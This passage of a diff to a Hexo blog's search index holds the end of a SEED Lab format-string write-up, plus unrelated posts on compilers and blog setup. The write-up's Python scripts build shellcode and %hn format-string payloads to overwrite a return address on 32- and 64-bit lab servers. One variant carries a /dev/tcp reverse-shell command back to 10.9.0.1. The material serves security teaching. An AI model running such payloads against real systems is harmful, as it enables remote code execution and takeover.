the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_32</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = N - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    Construct the format string here</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">shellcode_addr = <span class="number">0xffffd5d4</span>  <span class="comment"># 0xffffd080 + start</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(shellcode_addr))</span><br><span class="line">number  = <span class="number">0xffffcfa8</span> + <span class="number">4</span></span><br><span class="line">number_1 = number + <span class="number">2</span> </span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>] = (number_1).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%.8x.&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.54170x&quot;</span>  + <span class="string">&quot;%hn&quot;</span> + <span class="string">&quot;%.10795x&quot;</span> + <span class="string">&quot;%hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the format string to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>
-
-<p>成功执行shellcode。</p>
-<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211170251532.png" alt="image-20231211170251532"></p>
-<h2 id="7-Task-5-Attacking-the-64-bit-Server-Program"><a href="#7-Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="7 Task 5: Attacking the 64-bit Server Program"></a>7 Task 5: Attacking the 64-bit Server Program</h2><p>攻击64位机器，服务器选择10.9.0.6.首先发送hello消息</p>
-<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211170653364.png" alt="image-20231211170653364"></p>
-<p>问题：64位机器地址前两个字符为0x00，导致printf在解析地址时遇到<code>0x00</code>会停止解析（与overflow中strcpy不同，strcpy会直接截断，而此处的input仍然会传入，只是printf不会解析）</p>
-<p>可以使用<code>$kth</code>表示第k个参数，同时将地址放在input末尾避免此问题。</p>
-<p>构造payload如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = N - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    Construct the format string here</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">buf_addr = <span class="number">0x00007fffffffe5c0</span></span><br><span class="line">ret_addr = <span class="number">0x00007fffffffe500</span> + <span class="number">8</span></span><br><span class="line">shellcode_addr = buf_addr + start  <span class="comment"># 0x7fffffffeaf7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(shellcode_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># target_addr for test</span></span><br><span class="line">target_addr = <span class="number">0x0000555555558010</span></span><br><span class="line">number  = ret_addr</span><br><span class="line">number1 = number + <span class="number">2</span></span><br><span class="line">number2 = number + <span class="number">4</span></span><br><span class="line">number3 = number + <span class="number">6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;%46$.32767lx&quot;</span> + <span class="string">&quot;%46$hn&quot;</span> + <span class="string">&quot;%44$.27384lx&quot;</span> + <span class="string">&quot;%44$hn&quot;</span> + <span class="string">&quot;%45$.5384lx&quot;</span> + <span class="string">&quot;%45$hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = &quot;%44$lx.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">offset = <span class="number">80</span></span><br><span class="line">content[<span class="number">0</span>:<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line">content[offset:offset+<span class="number">8</span>] = (number).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[offset+<span class="number">8</span>:offset+<span class="number">16</span>] = (number1).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[offset+<span class="number">16</span>:offset+<span class="number">24</span>] = (number2).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment"># Save the format string to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>
-
-<p>其中需要注意高位地址恒为<code>0x0000</code>不需要修改，其他三个都需要进行修改。</p>
-<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211193743193.png" alt="image-20231211193743193"></p>
-<h3 id="8-Task-6-Fixing-the-Problem"><a href="#8-Task-6-Fixing-the-Problem" class="headerlink" title="8 Task 6: Fixing the Problem"></a>8 Task 6: Fixing the Problem</h3><p>修改如下。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// This line has a format-string vulnerability</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, msg);</span><br></pre></td></tr></table></figure>
-
-<p>重新编译发现警告信息消失：</p>
-<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211194112960.png" alt="image-20231211194112960"></p>
-<p>重新进行攻击，尝试打印出前100个参数，失败：</p>
-<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211194819158.png" alt="image-20231211194819158"></p>
-<h3 id="9-Guidelines-on-Reverse-Shell"><a href="#9-Guidelines-on-Reverse-Shell" class="headerlink" title="9 Guidelines on Reverse Shell"></a>9 Guidelines on Reverse Shell</h3><p>只需修改shellcode内容即可</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>成功获取root shell</p>
-<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211195911628.png" alt="image-20231211195911628"></p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>PWN</tag>
-        <tag>SEED Lab</tag>
-        <tag>Format String</tag>
       </tags>
   </entry>
   <entry>
@@ -1463,39 +1463,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux内核模块</title>
-    <url>/posts/b78b50e.html</url>
-    <content><![CDATA[<h2 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h2><p>GNC C Compiler —&gt; GNU Compiler Collection</p>
-<ul>
-<li>包括编译器、链接器、binutils、glibc、头文件</li>
-<li>支持多种语言（C、C++、Java、Go）和多种硬件平台（X86、ARM、MIPS、RISC-V）</li>
-</ul>
-<h2 id="Clang"><a href="#Clang" class="headerlink" title="Clang"></a>Clang</h2><p>编译器的构成</p>
-<ul>
-<li>Frontend：源码分析、语法检查，输出中间代码</li>
-<li>Optimizer：对中间代码进行优化、使其运行更高效</li>
-<li>Backend：将中间代码转换为某一个平台的机器代码</li>
-</ul>
-<p>编译器的实现</p>
-<ul>
-<li>GCC：前端和后端分离，支持多种语言、多个平台。但缺点：前后端耦合高，代码可重用性低。</li>
-<li>LLVM（Low Level Virtual Machine）框架：<strong>模块化设计</strong>，代码可重用性高；中间语言LLVM IR，<strong>类C表达</strong>，<strong>可扩展</strong>各种前端、后端；支持C&#x2F;C++&#x2F;Java等语言</li>
-<li>使用LLVM框架的编译器：<ul>
-<li>LLVM GCC：前端使用GCC（Apple）</li>
-<li>Clang：LLVM+Clang前端（使用C&#x2F;C++）（Apple，Android）</li>
-<li>方舟编译器：编译优化（Java虚拟机，效率提高），鸿蒙系统</li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>内核模块</tag>
-        <tag>交叉编译</tag>
-        <tag>gcc</tag>
-        <tag>clang</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>LKM编程</title>
     <url>/posts/79c0f484.html</url>
     <content><![CDATA[<h2 id="Chapter-1-Introduction"><a href="#Chapter-1-Introduction" class="headerlink" title="Chapter 1. Introduction"></a>Chapter 1. Introduction</h2><h3 id="1-1-What-Is-A-Kernel-Module"><a href="#1-1-What-Is-A-Kernel-Module" class="headerlink" title="1.1. What Is A Kernel Module?"></a>1.1. What Is A Kernel Module?</h3><p><strong>Linux系统内核：</strong>宏内核（与微内核相对），使用内核模块实现动态模块的加载运行。</p>
@@ -1755,6 +1722,39 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux内核模块</title>
+    <url>/posts/b78b50e.html</url>
+    <content><![CDATA[<h2 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h2><p>GNC C Compiler —&gt; GNU Compiler Collection</p>
+<ul>
+<li>包括编译器、链接器、binutils、glibc、头文件</li>
+<li>支持多种语言（C、C++、Java、Go）和多种硬件平台（X86、ARM、MIPS、RISC-V）</li>
+</ul>
+<h2 id="Clang"><a href="#Clang" class="headerlink" title="Clang"></a>Clang</h2><p>编译器的构成</p>
+<ul>
+<li>Frontend：源码分析、语法检查，输出中间代码</li>
+<li>Optimizer：对中间代码进行优化、使其运行更高效</li>
+<li>Backend：将中间代码转换为某一个平台的机器代码</li>
+</ul>
+<p>编译器的实现</p>
+<ul>
+<li>GCC：前端和后端分离，支持多种语言、多个平台。但缺点：前后端耦合高，代码可重用性低。</li>
+<li>LLVM（Low Level Virtual Machine）框架：<strong>模块化设计</strong>，代码可重用性高；中间语言LLVM IR，<strong>类C表达</strong>，<strong>可扩展</strong>各种前端、后端；支持C&#x2F;C++&#x2F;Java等语言</li>
+<li>使用LLVM框架的编译器：<ul>
+<li>LLVM GCC：前端使用GCC（Apple）</li>
+<li>Clang：LLVM+Clang前端（使用C&#x2F;C++）（Apple，Android）</li>
+<li>方舟编译器：编译优化（Java虚拟机，效率提高），鸿蒙系统</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>内核模块</tag>
+        <tag>交叉编译</tag>
+        <tag>gcc</tag>
+        <tag>clang</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DSE论文笔记</title>
     <url>/posts/25083369.html</url>
     <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>通过建立一个比较简单的语法简单中间语言（A simple intermediate language，SIMPIL）。对Dynamic taint analysis和forward symbolic execution进行了讲解。</p>
@@ -1772,6 +1772,39 @@
 ]]></content>
       <tags>
         <tag>DSE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo添加gittalk评论功能</title>
+    <url>/posts/f4a569f8.html</url>
+    <content><![CDATA[<p>Hexo博客评论区功能搭建过程记录</p>
+<p>尝试使用Gittalk来实现评论区功能，twikoo搭建过程中netlify账户验证不成功，还需要上传个人证件，比较抽象，因此还是采用gittalk的方式来构建评论区。</p>
+<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p><img src="/images/2024-10-27-Hexo%E6%B7%BB%E5%8A%A0gittalk%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.assets/image-20241028103236803.png" alt="image-20241028103236803"></p>
+<h2 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h2><ol>
+<li><p><strong>在github中设置oauth application功能</strong>：打开github个人settings界面<br><img src="/images/2024-10-27-Hexo%E6%B7%BB%E5%8A%A0gittalk%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.assets/image-20241028103444380.png" alt="image-20241028103444380"></p>
+<p>然后选择Developer settings，点击OAuth Apps，再选择新建New OAuth App：</p>
+<p><img src="/images/2024-10-27-Hexo%E6%B7%BB%E5%8A%A0gittalk%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.assets/image-20241028103534417.png" alt="image-20241028103534417"></p>
+<p>填写好名称，以及个人Hexo博客的地址即可获取到Client ID和ClientSecret，这两个需要在Hexo中进行配置。</p>
+<p><img src="/images/2024-10-27-Hexo%E6%B7%BB%E5%8A%A0gittalk%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.assets/image-20241028103619287.png" alt="image-20241028103619287"></p>
+</li>
+<li><p><strong>在Hexo Butterfly主题配置Gittalk：</strong></p>
+<p>参考<a href="https://butterfly.js.org/posts/4aa8abbe/?highlight=git#%E8%A9%95%E8%AB%96">官方文档</a>，在配置文件yml里填写好刚刚申请到的Client ID和ClientSecret就可以了。</p>
+</li>
+</ol>
+<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><ol>
+<li><p><strong>配置好后发现评论区没有初始化成功：</strong><img src="/images/2024-10-27-Hexo%E6%B7%BB%E5%8A%A0gittalk%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.assets/image-20241028104105092.png" alt="image-20241028104105092"></p>
+<p>原因是Gittalk需要管理员用户访问该页面才可以完成初始化，因此只需要点击登入完成认证即可。之后只需要访问一次其他文章界面就可以完成初始化。</p>
+</li>
+<li><p><strong>登入时报错Invalid Redirect URI</strong>：</p>
+<p><img src="/images/2024-10-27-Hexo%E6%B7%BB%E5%8A%A0gittalk%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.assets/image-20241028104306608.png" alt="image-20241028104306608"></p>
+<p>读报警信息可以知道，登入时所在url与配置github oauth app时配置的url不同，检查一下配置是否有问题即可。</p>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>教程</tag>
+        <tag>Hexo</tag>
+        <tag>建站</tag>
       </tags>
   </entry>
   <entry>
@@ -1882,39 +1915,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hexo添加gittalk评论功能</title>
-    <url>/posts/f4a569f8.html</url>
-    <content><![CDATA[<p>Hexo博客评论区功能搭建过程记录</p>
-<p>尝试使用Gittalk来实现评论区功能，twikoo搭建过程中netlify账户验证不成功，还需要上传个人证件，比较抽象，因此还是采用gittalk的方式来构建评论区。</p>
-<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p><img src="/images/2024-10-27-Hexo%E6%B7%BB%E5%8A%A0gittalk%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.assets/image-20241028103236803.png" alt="image-20241028103236803"></p>
-<h2 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h2><ol>
-<li><p><strong>在github中设置oauth application功能</strong>：打开github个人settings界面<br><img src="/images/2024-10-27-Hexo%E6%B7%BB%E5%8A%A0gittalk%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.assets/image-20241028103444380.png" alt="image-20241028103444380"></p>
-<p>然后选择Developer settings，点击OAuth Apps，再选择新建New OAuth App：</p>
-<p><img src="/images/2024-10-27-Hexo%E6%B7%BB%E5%8A%A0gittalk%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.assets/image-20241028103534417.png" alt="image-20241028103534417"></p>
-<p>填写好名称，以及个人Hexo博客的地址即可获取到Client ID和ClientSecret，这两个需要在Hexo中进行配置。</p>
-<p><img src="/images/2024-10-27-Hexo%E6%B7%BB%E5%8A%A0gittalk%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.assets/image-20241028103619287.png" alt="image-20241028103619287"></p>
-</li>
-<li><p><strong>在Hexo Butterfly主题配置Gittalk：</strong></p>
-<p>参考<a href="https://butterfly.js.org/posts/4aa8abbe/?highlight=git#%E8%A9%95%E8%AB%96">官方文档</a>，在配置文件yml里填写好刚刚申请到的Client ID和ClientSecret就可以了。</p>
-</li>
-</ol>
-<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><ol>
-<li><p><strong>配置好后发现评论区没有初始化成功：</strong><img src="/images/2024-10-27-Hexo%E6%B7%BB%E5%8A%A0gittalk%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.assets/image-20241028104105092.png" alt="image-20241028104105092"></p>
-<p>原因是Gittalk需要管理员用户访问该页面才可以完成初始化，因此只需要点击登入完成认证即可。之后只需要访问一次其他文章界面就可以完成初始化。</p>
-</li>
-<li><p><strong>登入时报错Invalid Redirect URI</strong>：</p>
-<p><img src="/images/2024-10-27-Hexo%E6%B7%BB%E5%8A%A0gittalk%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.assets/image-20241028104306608.png" alt="image-20241028104306608"></p>
-<p>读报警信息可以知道，登入时所在url与配置github oauth app时配置的url不同，检查一下配置是否有问题即可。</p>
-</li>
-</ol>
-]]></content>
-      <tags>
-        <tag>教程</tag>
-        <tag>Hexo</tag>
-        <tag>建站</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>WSL2配置Docker镜像源</title>
     <url>/posts/a7cc92dc.html</url>
     <content><![CDATA[<p>最近在搞PWN方向出题，需要用到docker环境部署，但是docker环境一直pull不下来，多次尝试后记录一下成功的配置。<br>由于不清楚是不是网络连接稳定导致的问题，此文章仅作参考。</p>
@@ -1927,6 +1927,38 @@
 ]]></content>
       <tags>
         <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo博客导航栏美化</title>
+    <url>/posts/a5aaf96c.html</url>
+    <content><![CDATA[<p>目前网站还是有一些问题，例如导航栏图标不全，还有样式比较丑…</p>
+<h2 id="初始效果"><a href="#初始效果" class="headerlink" title="初始效果"></a>初始效果</h2><p><img src="/images/2024-10-27-hexo%E5%8D%9A%E5%AE%A2%E5%AF%BC%E8%88%AA%E6%A0%8F%E7%BE%8E%E5%8C%96.assets/image-20241027222855421.png" alt="image-20241027222855421"></p>
+<h2 id="改进方法"><a href="#改进方法" class="headerlink" title="改进方法"></a>改进方法</h2><h3 id="添加导航栏图标"><a href="#添加导航栏图标" class="headerlink" title="添加导航栏图标"></a>添加导航栏图标</h3><p>查找<a href="https://fontawesome.com.cn/"><code>fontawesome</code></a>图标库</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">nav:</span></span><br><span class="line">  <span class="comment"># Navigation bar logo image</span></span><br><span class="line">  <span class="attr">logo:</span></span><br><span class="line">  <span class="attr">display_title:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Whether to fix navigation bar</span></span><br><span class="line">  <span class="attr">fixed:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="string">首页:</span>   <span class="string">/</span>           <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">文章||far</span> <span class="attr">fa-folder-open:</span></span><br><span class="line">    <span class="string">归档:</span>   <span class="string">/archives/</span>  <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">    <span class="string">标签:</span>   <span class="string">/tags/</span>      <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">    <span class="string">分类:</span>   <span class="string">/categories/</span>  <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">  </span><br><span class="line">  <span class="string">时间轴:</span> <span class="string">/sitetime</span>   <span class="string">||</span>  <span class="string">fad</span> <span class="string">fa-hourglass-end</span></span><br><span class="line">  <span class="string">清单||fas</span> <span class="attr">fa-heartbeat:</span></span><br><span class="line">    <span class="string">音乐:</span> <span class="string">/music/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-music</span></span><br><span class="line">    <span class="string">照片:</span> <span class="string">/Gallery/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-images</span></span><br><span class="line">    <span class="string">电影:</span> <span class="string">/movies/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-video</span></span><br><span class="line">    <span class="string">关于:</span> <span class="string">/about/</span> <span class="string">||</span>  <span class="string">far</span> <span class="string">fa-paper-plane</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="鼠标移入菜单效果"><a href="#鼠标移入菜单效果" class="headerlink" title="鼠标移入菜单效果"></a>鼠标移入菜单效果</h3><p>原本是鼠标悬浮后标签下出现蓝条，现在改为放大效果，通过添加自定义CSS实现</p>
+<ol>
+<li><p>在博客根目录source目录下创建好css、js、img文件夹，用来存放自定义的文件，这里我将这些文件夹统一放在&#x2F;source&#x2F;config目录下：</p>
